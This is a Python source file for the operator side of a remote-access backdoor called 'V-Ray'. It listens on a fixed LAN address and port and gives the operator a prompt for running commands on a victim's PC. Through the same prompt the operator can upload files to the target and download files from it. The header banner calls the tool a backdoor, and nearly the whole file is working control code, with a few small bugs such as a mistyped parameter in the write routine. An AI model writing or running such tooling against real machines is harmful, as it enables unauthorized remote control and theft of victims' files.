import socket
import base64 as code
import subprocess as sub


def list_to_str(list):
    new_str = ""
    for element in list:
        new_str = new_str + element + ' '
    return new_str

class Connection:
    def __init__(self):
        self.history = []
        self.listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

    def start(self):
        print("[!] Waiting for any connection...")
        self.listen.bind(("192.168.1.8", 4444))
        self.listen.listen(0)
        self.connection, address = self.listen.accept()
        print("[+] Accepted")
        print("""\033[0;32m
        
        
                       //▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\\\\
                      //_______________________________\\\\
                     //                                 \\\\
                    |$#|                              ◄|#$|
                    |$#|►       \\\\-          -//      ◄|#$|
                    |$#|►        \\\\-        -//       ◄|#$|
                    |$#|►         \\\\-      -//        ◄|#$|
                    |$#|►          \\\\-    -//         ◄|#$|
                    |$#|►           \\\\-  -//          ◄|#$|
                    |$#|►            \\\\--//           ◄|#$|
                    |$#|►             \\\\//            ◄|#$|
                    |$#|►              \/             ◄|#$|
                    |$#|                              ◄|#$|
                     \\\\|▬▬|▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬|▬▬|//
                      \\\\|▬▬|▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬|▬▬|//

                    

                      [The tool's name      : V-Ray]
                      [Created by           : Hack0X1999]
                      [Country              : Egypt]
                      \033[0;35m[Gethub     : https://github.com/Abdelrahman)
                      (-Security159/Penetrating/issues]
                      \033[0;33m[License    : Free_with_good_using]
                      \033[0;31m[!] Worning! I'm not responsible about any)
                      (bad using of this backdoor]\033[0m
        """)
    def send(self, data):
        self.connection.send(data.encode("UTF-8"))

    def send_noUTF(self, data):
        self.connection.send(data)

    def recv(self):
        data = ""
        buffer = 1024
        while True:
            part = self.connection.recv(buffer).decode("UTF-8")
            self.length = len(part)
            data += part
            if len(part) < buffer:
                break
            print(data)
        return data

    def recv_download(self):
        return self.connection.recv(1024).decode("UTF-8")

    def close(self):
        self.connection.close()

    def read(self, path):
        with open(path, "rb") as file:
            return code.b64encode(file.read())

    def write(self, path, date):
        with open(path, "wb") as file:
            file.write(code.b64decode(data))
            sub.call("mv " + path + " ~/Desktop/PythonProjects/backdoor/downloaded_files/", shell=True)



#<<<<<<<<<<<<<<<<<<<<<<<< Running >>>>>>>>>>>>>>>>>>>>>>>>>>#

hack = Connection()
hack.start()
while True:
    try:
        command = input("DedSec/~>> ").split(' ')
        hack.history.append(list_to_str(command))
        if command[0] == "exit":
            hack.send(list_to_str(command))
            hack.close()
            exit()
        elif command[0] == "help":
            print("""
            +==============================================================+
            +             Welcome in V-ray backdoor v1.0 .                 +
            +==============================================================+

            All you need here is write the commands and
            -it must be run on target PC.

            here some of owr features:
            1- write most windows commands.
            2- 'history'           => get all your command which been written.
            3- 'upload file.ext'   => upload file.extention on target PC. <New>
            4- 'download file.ext' => download file.extention from target's PC. <New>
	       4.1- create 'download_files' directory to forware download in.
	       4.2- change your directory as you like from => def write(self, path, data): <=	
            5- 'help'              => to get this message.
            6- 'exit'              => terminate the program.
            7- fix some of 'Beta' bugs :-
               7.1- Downloading bug which like download large file get Exception in buffer pipe data transefaring. <New>
            
            For any reporting : Our links above.
            """)
            continue
        elif command[0] == "cd" and len(command) > 1:
            hack.send(list_to_str(command))
        elif command[0] == "history":
            counter = 1
            for element in hack.history:
                print(f"{counter} : {element}")
                counter += 1
            continue
        elif command[0] == "upload":
            count = 0
            data = hack.read(command[1])
            while True:
                if count == 0:
                    hack.send(list_to_str(command))
                    count += 1
                ack = hack.recv()
                if ack == "OK":
                    print("[+] Acknoledgment of Command was receved.")
                    hack.send_noUTF(data)
                    ack = hack.recv()
                    if ack == "OK":
                        print("[+] Acknoledgment of Data was receved.")
                        hack.send(str(len(data)) + " ")
                        print("Length : " + str(len(data)))
                        ack = hack.recv()
                        if ack == "NO":
                            print("NO")
                            continue
                        else:
                            print(ack)
                            break # Don't forget the comments
            continue
        elif command[0] == "download":
            hack.send(list_to_str(command))
            ack = hack.recv()
            if ack == "OK":
                print("[+] Accepted.")
                hack.send(command[1] + " ")
                ack = hack.recv()
                if ack == "OK":
                    print("[+] Got path.")
                    hack.send("length ")
                    length = hack.recv()
                    print("[!] Length is       : " + str(length))
                    hack.send("data ")
                    data = ""
                    while True:
                        part = hack.recv_download()
                        if len(part) < 1024:
                            data += part
                            hack.write(command[1], data)
                            break
                        else:
                            data += part
                            hack.send("OK ")
            continue
        else:
            data_to_send = list_to_str(command)
            hack.send(data_to_send)

        data = hack.recv()
        if data == "chdir":
            print("[+] Changed Successfully.")
        else:
            print(data)

    #except Exception:
    #    print("[-] Error was found.")
    except KeyboardInterrupt:
        print("\n[-] Program was interrubted.")
        break
